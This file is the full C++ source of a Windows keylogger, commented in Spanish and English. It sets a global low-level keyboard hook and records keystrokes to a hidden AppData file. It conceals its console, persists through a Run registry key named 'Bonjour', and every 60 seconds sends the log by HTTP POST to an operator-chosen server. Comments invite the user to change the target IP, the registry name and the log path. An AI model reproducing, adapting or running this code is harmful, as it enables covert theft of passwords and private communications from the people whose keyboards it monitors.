#define WIN32_LEAN_AND_MEAN
#define WINHTTP_NO_ADDITIONAL_HEADERS NULL

#include <windows.h>
#include <shlobj.h>    // Para SHGetFolderPath y CSIDL_APPDATA
#include <winhttp.h>
#include <fstream>
#include <string>
#include <thread>
#include <vector>

#pragma comment(lib, "winhttp.lib")

std::string logFilePath;
HHOOK keyboardHook;

// Envía datos vía WinHttp POST a ip:puerto/data (sin cifrado)
// Send the data via WinHttp POST to ip:port/data (Without Cipher)
bool SendPost(const char* data, DWORD data_len) {
    BOOL bResults = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    LPCWSTR headers = L"Content-Type: application/octet-stream\r\n";

    hSession = WinHttpOpen(L"Cliente C WinHttp/1.0",
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME,
                           WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession)
        return false;

    hConnect = WinHttpConnect(hSession, L"localhost", 80, 0); //Change "localhost" for your ip and  "80" for yout server port
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/data",
                                 NULL, WINHTTP_NO_REFERER,
                                 WINHTTP_DEFAULT_ACCEPT_TYPES,
                                 0);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    bResults = WinHttpSendRequest(hRequest,
                                  headers, (DWORD)wcslen(headers),
                                  (LPVOID)data, data_len,
                                  data_len, 0);
    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return bResults ? true : false;
}

// Hilo que periódicamente envía el contenido del log y luego lo limpia
void SenderThread() {
    while (true) {
        Sleep(60000); // Espera 60 segundos antes de enviar (ajustable)
        std::ifstream inFile(logFilePath, std::ios::binary);
        if (!inFile.is_open())
            continue;

        // Leer todo el archivo
        std::vector<char> buffer((std::istreambuf_iterator<char>(inFile)),
                                 std::istreambuf_iterator<char>());
        inFile.close();

        if (buffer.empty())
            continue;  // No enviar si nada

        if (SendPost(buffer.data(), (DWORD)buffer.size())) {
            // Si envío fue exitoso, vaciar el archivo log
            std::ofstream outFile(logFilePath, std::ios::trunc | std::ios::binary);
            outFile.close();
        }
    }
}

// Codigo para registar las teclas
void LogKey(int vkCode) {
    std::ofstream logFile(logFilePath, std::ios::app | std::ios::binary);
    if (!logFile.is_open()) return;

    if (vkCode == VK_RETURN) {
        logFile << "\n";
        return;
    }
    if (vkCode == VK_BACK) {
        logFile << "[BKSP]";
        return;
    }
    if (vkCode == VK_SPACE) {
        logFile << " ";
        return;
    }

    //Obtiene el estado actual de todas las teclas (presionadas/activadas)
    BYTE keyboardState[256];
    if (!GetKeyboardState(keyboardState)) return;

    //Actualiza manualmente el estado de las teclas Shift, Control y Alt para reflejar si están presionadas en este momento
    keyboardState[VK_SHIFT] = (GetAsyncKeyState(VK_SHIFT) & 0x8000) ? 0x80 : 0;
    keyboardState[VK_CONTROL] = (GetAsyncKeyState(VK_CONTROL) & 0x8000) ? 0x80 : 0;
    keyboardState[VK_MENU] = (GetAsyncKeyState(VK_MENU) & 0x8000) ? 0x80 : 0;

    UINT scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    WCHAR buff[5] = {0};
    int result = ToUnicode(vkCode, scanCode, keyboardState, buff, 4, 0);

    if (result == -1) {
        WCHAR dummy[5] = {0};
        ToUnicode(vkCode, scanCode, keyboardState, dummy, 4, 0);
        return;
    }

    if (result > 0) {
        char ch = (char)buff[0];
        if (ch >= 32 && ch <= 126) {
            logFile << ch;
        }
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        LogKey(p->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
//Establece un hook global de teclado de bajo nivel que va a llamar a KeyboardProc para cada tecla pulsada.
void SetHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
}
//Elimina el hook instalado.
void RemoveHook() {
    UnhookWindowsHookEx(keyboardHook);
}
//Obtiene la ruta completa del ejecutable actual y la guarda en path.
void AddToStartup() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", // This is a route for the persistence, you can change the route if you want it
                                                                         // Esta es la ruta donde se almacenara el registro de persistencia, si quieres lo puedes cambiar
                     0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey,
                      "Bonjour", // Persistence Register name, change if you want it
                                // Este es el nombre del registro, puedes tranquilamente cambiarlo
                      0,
                      REG_SZ,
                      (BYTE*)path,
                      (DWORD)(strlen(path) + 1));
        RegCloseKey(hKey);
    }
}

void HideConsole() {
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);
}

int main() {
    HideConsole();

    char appdataPath[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdataPath) == S_OK) {
        logFilePath = std::string(appdataPath) + "\\system.log"; // Route for de system.log, here is the site where the keyboard stroke are storage
                                                                //Esta es la ruta del system.log, aqui es donde se guardaran las pulsaciones del teclado
    } else {
        logFilePath = "C:\\temp\\system.log"; // fallback path
    }

    DWORD attrs = GetFileAttributesA(logFilePath.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        std::ofstream f(logFilePath);
        f.close();
        SetFileAttributesA(logFilePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }

    AddToStartup();

    // Lanzar hilo que envía los logs periódicamente 
    // Launch the thread to send the logs periodically
    std::thread sender(SenderThread);
    sender.detach();

    SetHook();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    RemoveHook();

    return 0;
}
